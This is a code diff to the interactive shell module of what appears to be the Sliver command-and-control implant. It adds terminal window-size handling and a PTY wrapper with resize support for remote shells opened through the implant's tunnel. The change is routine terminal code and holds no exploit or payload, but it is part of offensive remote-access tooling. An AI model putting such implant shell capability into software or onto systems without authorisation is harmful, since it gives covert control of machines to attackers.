@@ -21,13 +21,15 @@ package shell
 */
 
 import (
-
 	// {{if .Config.Debug}}
 	"log"
 	// {{end}}
 
 	"context"
+	"os"
 	"os/exec"
+	"sync"
+	"syscall"
 
 	"github.com/bishopfox/sliver/implant/sliver/shell/pty"
 )
@@ -45,9 +47,9 @@ func Start(command string) error {
 }
 
 // StartInteractive - Start a shell
-func StartInteractive(tunnelID uint64, command []string, enablePty bool) (*Shell, error) {
+func StartInteractive(tunnelID uint64, command []string, enablePty bool, rows, cols uint16) (*Shell, error) {
 	if enablePty {
-		return ptyShell(tunnelID, command)
+		return ptyShell(tunnelID, command, rows, cols)
 	}
 	return pipedShell(tunnelID, command)
 }
@@ -98,7 +100,7 @@ func pipedShell(tunnelID uint64, command []string) (*Shell, error) {
 	}, err
 }
 
-func ptyShell(tunnelID uint64, command []string) (*Shell, error) {
+func ptyShell(tunnelID uint64, command []string, rows, cols uint16) (*Shell, error) {
 	// {{if .Config.Debug}}
 	log.Printf("[ptmx] %s", command)
 	// {{end}}
@@ -106,7 +108,7 @@ func ptyShell(tunnelID uint64, command []string) (*Shell, error) {
 	ctx, cancel := context.WithCancel(context.Background())
 
 	cmd := exec.CommandContext(ctx, command[0], command[1:]...)
-	term, err := pty.Start(cmd)
+	ptyFile, ttyFile, err := pty.Open()
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("[term] %v, falling back to piped shell...", err)
@@ -115,6 +117,39 @@ func ptyShell(tunnelID uint64, command []string) (*Shell, error) {
 		return pipedShell(tunnelID, command)
 	}
 
+	ttyPath := ttyFile.Name()
+
+	if rows > 0 && cols > 0 {
+		sz := &pty.Winsize{Rows: rows, Cols: cols}
+		_ = pty.Setsize(ttyFile, sz)
+		_ = pty.Setsize(ptyFile, sz)
+	}
+
+	cmd.Stdout = ttyFile
+	cmd.Stdin = ttyFile
+	cmd.Stderr = ttyFile
+	if cmd.SysProcAttr == nil {
+		cmd.SysProcAttr = &syscall.SysProcAttr{}
+	}
+	cmd.SysProcAttr.Setctty = true
+	cmd.SysProcAttr.Setsid = true
+	err = cmd.Start()
+	if err != nil {
+		ptyFile.Close()
+		ttyFile.Close()
+		// {{if .Config.Debug}}
+		log.Printf("[term] %v, falling back to piped shell...", err)
+		// {{end}}
+		cancel()
+		return pipedShell(tunnelID, command)
+	}
+
+	term := &ptyRWC{
+		pty: ptyFile,
+		tty: ttyPath,
+	}
+	_ = ttyFile.Close()
+
 	return &Shell{
 		ID:      tunnelID,
 		Command: cmd,
@@ -122,6 +157,66 @@ func ptyShell(tunnelID uint64, command []string) (*Shell, error) {
 		Stdin:   term,
 		Cancel:  cancel,
 	}, err
+}
+
+type ptyRWC struct {
+	pty *os.File
+	tty string
+
+	closeOnce sync.Once
+}
+
+func (p *ptyRWC) Read(b []byte) (int, error) {
+	return p.pty.Read(b)
+}
+
+func (p *ptyRWC) Write(b []byte) (int, error) {
+	return p.pty.Write(b)
+}
+
+func (p *ptyRWC) Close() error {
+	var retErr error
+	p.closeOnce.Do(func() {
+		if p.pty != nil {
+			retErr = p.pty.Close()
+		}
+	})
+	return retErr
+}
+
+func (p *ptyRWC) Resize(rows, cols uint32) error {
+	if rows > 0xffff {
+		rows = 0xffff
+	}
+	if cols > 0xffff {
+		cols = 0xffff
+	}
+	if rows == 0 || cols == 0 {
+		return nil
+	}
+
+	sz := &pty.Winsize{Rows: uint16(rows), Cols: uint16(cols)}
+	errTTY := error(nil)
+	if p.tty != "" {
+		ttyFile, err := os.OpenFile(p.tty, os.O_RDWR|syscall.O_NOCTTY, 0)
+		if err != nil {
+			errTTY = err
+		} else {
+			errTTY = pty.Setsize(ttyFile, sz)
+			_ = ttyFile.Close()
+		}
+	}
+	errPTY := error(nil)
+	if p.pty != nil {
+		errPTY = pty.Setsize(p.pty, sz)
+	}
+	if errTTY == nil || errPTY == nil {
+		return nil
+	}
+	if errTTY != nil {
+		return errTTY
+	}
+	return errPTY
 }
 
 // GetSystemShellPath - Find bash or sh
